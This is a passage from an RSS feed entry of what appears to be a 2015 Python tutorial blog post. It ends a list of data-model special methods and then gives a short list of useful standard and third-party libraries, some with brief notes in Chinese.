&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__delitem__&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;del x[key]&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ref  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/2/reference/datamodel.html"&gt;3. Data model — Python 2.7.10 documentation&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/3/reference/datamodel.html"&gt;3. Data model — Python 3.5.0 documentation&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Useful Libraies&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;collections&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;re&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;random&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;datetime&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;decimal&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;寫金融軟體的話要用 &lt;code&gt;decimal&lt;/code&gt; 不要用 &lt;code&gt;float&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pickle&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;json&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;timeit&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;對程式做計時, 看效率  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;doctest&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;unittest&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;pdb&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;debugger  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;requests&lt;/code&gt; (3rd party)  &lt;ul&gt;
&lt;li&gt;拿來送 http request 的, 內建的 &lt;code&gt;urlib&lt;/code&gt; 很難用  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;flask&lt;/code&gt; (3rd party)  &lt;ul&gt;
&lt;li&gt;a web framework  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Tue, 27 Oct 2015 11:20:00 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2013-04-09:posts/2013/04/09/tutorial-for-open-source-dynamic-typing-language-python/</guid><category>Python</category><category>Tutorial</category></item></channel></rss>